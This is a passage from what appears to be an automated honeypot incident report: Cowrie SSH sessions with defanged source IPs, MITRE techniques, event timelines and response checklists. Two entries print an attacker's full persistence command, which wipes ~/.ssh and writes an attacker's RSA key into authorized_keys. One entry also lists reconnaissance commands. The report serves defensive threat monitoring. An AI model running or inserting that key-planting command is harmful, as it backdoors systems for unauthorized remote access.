| `2026-08-25 17:13:46` | `cowrie.client.version` |
| `2026-08-25 17:13:47` | `cowrie.client.kex` |
| `2026-08-25 17:13:49` | `cowrie.login.success` |
| `2026-08-25 17:13:53` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:13:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 17:13:53` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-401429a28533

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 17:13 |
| **Last Seen** | 2026-08-25 17:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:13:50` | `cowrie.session.connect` |
| `2026-08-25 17:13:50` | `cowrie.client.version` |
| `2026-08-25 17:13:50` | `cowrie.client.kex` |
| `2026-08-25 17:13:52` | `cowrie.login.success` |
| `2026-08-25 17:13:52` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:13:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 17:13:52` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5f6970da63f

| Field | Detail |
|---|---|
| **Source IP** | `118.145.238[.]115` |
| **First Seen** | 2026-08-25 17:14 |
| **Last Seen** | 2026-08-25 17:19 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:14:57` | `cowrie.session.connect` |
| `2026-08-25 17:14:57` | `cowrie.client.version` |
| `2026-08-25 17:14:57` | `cowrie.client.kex` |
| `2026-08-25 17:14:59` | `cowrie.login.success` |
| `2026-08-25 17:15:00` | `cowrie.session.params` |
| `2026-08-25 17:15:00` | `cowrie.command.input` |
| `2026-08-25 17:15:00` | `cowrie.command.failed` |
| `2026-08-25 17:15:00` | `cowrie.log.closed` |
| `2026-08-25 17:15:01` | `cowrie.session.params` |
| `2026-08-25 17:15:01` | `cowrie.command.input` |
| `2026-08-25 17:15:01` | `cowrie.session.file_download` |
| `2026-08-25 17:15:01` | `cowrie.log.closed` |
| `2026-08-25 17:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.238[.]115` to AbuseIPDB if not already reported
- [ ] Block `118.145.238[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32c176e62ad6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-25 17:14 |
| **Last Seen** | 2026-08-25 17:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:14:58` | `cowrie.session.connect` |
| `2026-08-25 17:14:58` | `cowrie.client.version` |
| `2026-08-25 17:14:58` | `cowrie.client.kex` |
| `2026-08-25 17:14:58` | `cowrie.login.success` |
| `2026-08-25 17:14:58` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:14:58` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:14:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdcadd6f5298

| Field | Detail |
|---|---|
| **Source IP** | `210.79.142[.]201` |
| **First Seen** | 2026-08-25 17:17 |
| **Last Seen** | 2026-08-25 17:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:17:16` | `cowrie.session.connect` |
| `2026-08-25 17:17:16` | `cowrie.client.version` |
| `2026-08-25 17:17:16` | `cowrie.client.kex` |
| `2026-08-25 17:17:17` | `cowrie.login.success` |
| `2026-08-25 17:17:18` | `cowrie.session.params` |
| `2026-08-25 17:17:18` | `cowrie.command.input` |
| `2026-08-25 17:17:18` | `cowrie.command.failed` |
| `2026-08-25 17:17:19` | `cowrie.log.closed` |
| `2026-08-25 17:17:20` | `cowrie.session.params` |
| `2026-08-25 17:17:20` | `cowrie.command.input` |
| `2026-08-25 17:17:20` | `cowrie.session.file_download` |
| `2026-08-25 17:17:20` | `cowrie.log.closed` |
| `2026-08-25 17:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.142[.]201` to AbuseIPDB if not already reported
- [ ] Block `210.79.142[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c66a73e8db2

| Field | Detail |
|---|---|
| **Source IP** | `210.79.142[.]201` |
| **First Seen** | 2026-08-25 17:17 |
| **Last Seen** | 2026-08-25 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:17:20` | `cowrie.session.connect` |
| `2026-08-25 17:17:20` | `cowrie.client.version` |
| `2026-08-25 17:17:20` | `cowrie.client.kex` |
| `2026-08-25 17:17:21` | `cowrie.login.success` |
| `2026-08-25 17:17:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.142[.]201` to AbuseIPDB if not already reported
- [ ] Block `210.79.142[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-204d3b9ae3e7

| Field | Detail |
|---|---|
| **Source IP** | `210.79.142[.]201` |
| **First Seen** | 2026-08-25 17:17 |
| **Last Seen** | 2026-08-25 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:17:22` | `cowrie.session.connect` |
| `2026-08-25 17:17:22` | `cowrie.client.version` |
| `2026-08-25 17:17:22` | `cowrie.client.kex` |
| `2026-08-25 17:17:23` | `cowrie.login.success` |
| `2026-08-25 17:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.142[.]201` to AbuseIPDB if not already reported
- [ ] Block `210.79.142[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cdae33ab6fb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 17:24 |
| **Last Seen** | 2026-08-25 17:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:24:18` | `cowrie.session.connect` |
| `2026-08-25 17:24:18` | `cowrie.client.version` |
| `2026-08-25 17:24:18` | `cowrie.client.kex` |
| `2026-08-25 17:24:19` | `cowrie.login.success` |
| `2026-08-25 17:24:19` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:24:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 17:24:19` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8853f34aabf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 17:24 |
| **Last Seen** | 2026-08-25 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:24:22` | `cowrie.session.connect` |
| `2026-08-25 17:24:22` | `cowrie.client.version` |
| `2026-08-25 17:24:23` | `cowrie.client.kex` |
| `2026-08-25 17:24:23` | `cowrie.login.success` |
| `2026-08-25 17:24:24` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:24:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 17:24:24` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd9c7d56e107

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 17:34 |
| **Last Seen** | 2026-08-25 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:34:02` | `cowrie.session.connect` |
| `2026-08-25 17:34:02` | `cowrie.client.version` |
| `2026-08-25 17:34:03` | `cowrie.client.kex` |
| `2026-08-25 17:34:04` | `cowrie.login.success` |
| `2026-08-25 17:34:04` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:34:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 17:34:04` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-746674d22181

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 17:34 |
| **Last Seen** | 2026-08-25 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:34:06` | `cowrie.session.connect` |
| `2026-08-25 17:34:06` | `cowrie.client.version` |
| `2026-08-25 17:34:06` | `cowrie.client.kex` |
| `2026-08-25 17:34:07` | `cowrie.login.success` |
| `2026-08-25 17:34:07` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:34:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 17:34:08` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2f73ff27bed

| Field | Detail |
|---|---|
| **Source IP** | `207.46.224[.]87` |
| **First Seen** | 2026-08-25 17:37 |
| **Last Seen** | 2026-08-25 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:37:02` | `cowrie.session.connect` |
| `2026-08-25 17:37:02` | `cowrie.client.version` |
| `2026-08-25 17:37:03` | `cowrie.client.kex` |
| `2026-08-25 17:37:03` | `cowrie.login.success` |
| `2026-08-25 17:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.46.224[.]87` to AbuseIPDB if not already reported
- [ ] Block `207.46.224[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede5c17a7b22

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 17:43 |
| **Last Seen** | 2026-08-25 17:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:43:58` | `cowrie.session.connect` |
| `2026-08-25 17:43:59` | `cowrie.client.version` |
| `2026-08-25 17:43:59` | `cowrie.client.kex` |
| `2026-08-25 17:44:00` | `cowrie.login.success` |
| `2026-08-25 17:44:00` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:44:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 17:44:00` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7669859b1613

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 17:44 |
| **Last Seen** | 2026-08-25 17:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:44:01` | `cowrie.session.connect` |
| `2026-08-25 17:44:01` | `cowrie.client.version` |
| `2026-08-25 17:44:01` | `cowrie.client.kex` |
| `2026-08-25 17:44:02` | `cowrie.login.success` |
| `2026-08-25 17:44:03` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:44:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 17:44:03` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:44:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b677f8cbee71

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 17:53 |
| **Last Seen** | 2026-08-25 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:53:24` | `cowrie.session.connect` |
| `2026-08-25 17:53:24` | `cowrie.client.version` |
| `2026-08-25 17:53:24` | `cowrie.client.kex` |
| `2026-08-25 17:53:25` | `cowrie.login.success` |
| `2026-08-25 17:53:25` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:53:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 17:53:25` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c395b1cc7c8e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 17:53 |
| **Last Seen** | 2026-08-25 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:53:29` | `cowrie.session.connect` |
| `2026-08-25 17:53:29` | `cowrie.client.version` |
| `2026-08-25 17:53:30` | `cowrie.client.kex` |
| `2026-08-25 17:53:31` | `cowrie.login.success` |
| `2026-08-25 17:53:31` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:53:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 17:53:31` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ea464e278ba

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 18:03 |
| **Last Seen** | 2026-08-25 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:03:10` | `cowrie.session.connect` |
| `2026-08-25 18:03:10` | `cowrie.client.version` |
| `2026-08-25 18:03:10` | `cowrie.client.kex` |
| `2026-08-25 18:03:11` | `cowrie.login.success` |
| `2026-08-25 18:03:11` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:03:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 18:03:11` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddf61af14da7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 18:03 |
| **Last Seen** | 2026-08-25 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:03:13` | `cowrie.session.connect` |
| `2026-08-25 18:03:13` | `cowrie.client.version` |
| `2026-08-25 18:03:13` | `cowrie.client.kex` |
| `2026-08-25 18:03:14` | `cowrie.login.success` |
| `2026-08-25 18:03:14` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:03:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 18:03:14` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:03:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da4253957c76

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 18:12 |
| **Last Seen** | 2026-08-25 18:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:12:43` | `cowrie.session.connect` |
| `2026-08-25 18:12:43` | `cowrie.client.version` |
| `2026-08-25 18:12:43` | `cowrie.client.kex` |
| `2026-08-25 18:12:44` | `cowrie.login.success` |
| `2026-08-25 18:12:45` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:12:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 18:12:45` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5e545239766

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 18:12 |
| **Last Seen** | 2026-08-25 18:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:12:48` | `cowrie.session.connect` |
| `2026-08-25 18:12:48` | `cowrie.client.version` |
| `2026-08-25 18:12:48` | `cowrie.client.kex` |
| `2026-08-25 18:12:49` | `cowrie.login.success` |
| `2026-08-25 18:12:49` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:12:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 18:12:49` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a097737a3f2e

| Field | Detail |
|---|---|
| **Source IP** | `125.140.145[.]62` |
| **First Seen** | 2026-08-25 18:16 |
| **Last Seen** | 2026-08-25 18:17 |
| **Session Duration** | 76s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:16:37` | `cowrie.session.connect` |
| `2026-08-25 18:16:37` | `cowrie.client.version` |
| `2026-08-25 18:16:37` | `cowrie.client.kex` |
| `2026-08-25 18:16:43` | `cowrie.login.failed` |
| `2026-08-25 18:16:44` | `cowrie.login.success` |
| `2026-08-25 18:16:45` | `cowrie.session.params` |
| `2026-08-25 18:16:45` | `cowrie.command.input` |
| `2026-08-25 18:16:45` | `cowrie.command.failed` |
| `2026-08-25 18:16:45` | `cowrie.log.closed` |
| `2026-08-25 18:16:46` | `cowrie.session.params` |
| `2026-08-25 18:16:46` | `cowrie.command.input` |
| `2026-08-25 18:16:46` | `cowrie.log.closed` |
| `2026-08-25 18:16:47` | `cowrie.session.params` |
| `2026-08-25 18:16:47` | `cowrie.command.input` |
| `2026-08-25 18:16:48` | `cowrie.log.closed` |
| `2026-08-25 18:16:49` | `cowrie.session.params` |
| `2026-08-25 18:16:49` | `cowrie.command.input` |
| `2026-08-25 18:16:49` | `cowrie.log.closed` |
| `2026-08-25 18:16:50` | `cowrie.session.params` |
| `2026-08-25 18:16:50` | `cowrie.command.input` |
| `2026-08-25 18:16:50` | `cowrie.log.closed` |
| `2026-08-25 18:16:51` | `cowrie.session.params` |
| `2026-08-25 18:16:51` | `cowrie.command.input` |
| `2026-08-25 18:16:51` | `cowrie.log.closed` |
| `2026-08-25 18:16:52` | `cowrie.session.params` |
| `2026-08-25 18:16:52` | `cowrie.command.input` |
| `2026-08-25 18:16:52` | `cowrie.log.closed` |
| `2026-08-25 18:16:53` | `cowrie.session.params` |
| `2026-08-25 18:16:53` | `cowrie.command.input` |
| `2026-08-25 18:16:54` | `cowrie.log.closed` |
| `2026-08-25 18:16:55` | `cowrie.session.params` |
| `2026-08-25 18:16:55` | `cowrie.command.input` |
| `2026-08-25 18:16:55` | `cowrie.log.closed` |
| `2026-08-25 18:17:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.140.145[.]62` to AbuseIPDB if not already reported
- [ ] Block `125.140.145[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d374c341853

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 18:22 |
| **Last Seen** | 2026-08-25 18:22 |
| **Session Duration** | 1s |
